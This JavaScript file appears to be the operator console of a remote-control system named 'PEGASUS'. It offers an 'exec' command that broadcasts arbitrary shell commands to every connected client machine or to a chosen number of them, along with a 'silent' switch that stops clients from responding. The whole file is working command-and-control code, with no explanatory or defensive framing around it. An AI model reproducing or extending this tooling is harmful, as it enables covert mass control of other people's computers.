import readline from "readline";
import fs from "fs";
import { clientModules, broadcast } from "./server.js";

const rl = readline.createInterface({
	input: process.stdin,
	output: process.stdout,
});

const help = fs.readFileSync("../config/help", "utf8");

const commandsHelp = [
	{
		command: "exec",
		functionality: "Executes shell commands remotely",
		usage: "exec <command>",
	},
	{
		command: "instances",
		functionality: "Limits number of machines running a command",
		usage: "instances <number>",
	},
	{
		command: "help",
		functionality: "Shows you how to use commands",
		usage: "help <command>",
	},
	{
		command: "silent",
		functionality: "Silents clients from responding",
		usage: "silent (boolean)",
	}
];

export default function prompt() {
	rl.question("\x1b[31m[PEGASUS]\x1b[0m ", (message) => {
		message = message.toLowerCase();

		if (message.startsWith("instances")) {
			if (message === "instances") {
				console.log(`Instances: ${clientModules.clientInstances.length}`);
			}
			if (message.split(" ")[1] <= clientModules.clients.length) {
				clientModules.clientInstances = [...clientModules.clients];
				clientModules.clientInstances = clientModules.clientInstances.slice(
					0,
					message.split(" ")[1]
				);
			}
		}

		if (message.split(" ")[1] === "all")
			clientModules.clientInstances = [...clientModules.clients];

		if (message.startsWith("help")) {
			if (message === "help") console.log(`\n${help}`);
			if (
				commandsHelp.filter((i) => i.command === message.split(" ")[1]).length >
				0
			) {
				let commandIndex = commandsHelp
					.map((i) => i.command)
					.indexOf(message.split(" ")[1]);

				console.log(
					`Functionality: ${commandsHelp[commandIndex].functionality}\nUsage: ${commandsHelp[commandIndex].usage}\n`
				);
			}
		}

		if (message.startsWith("silent")) {
			if (message === "silent") console.log(`silent: ${clientModules.silent}`);
			if (message.split(" ")[1] === "true") {
				clientModules.silent = true;
			} else if (message.split(" ")[1] === "false") {
				clientModules.silent = false;
			}
		}

		if (message.startsWith("exec")) broadcast(message);

		return prompt();
	});
}
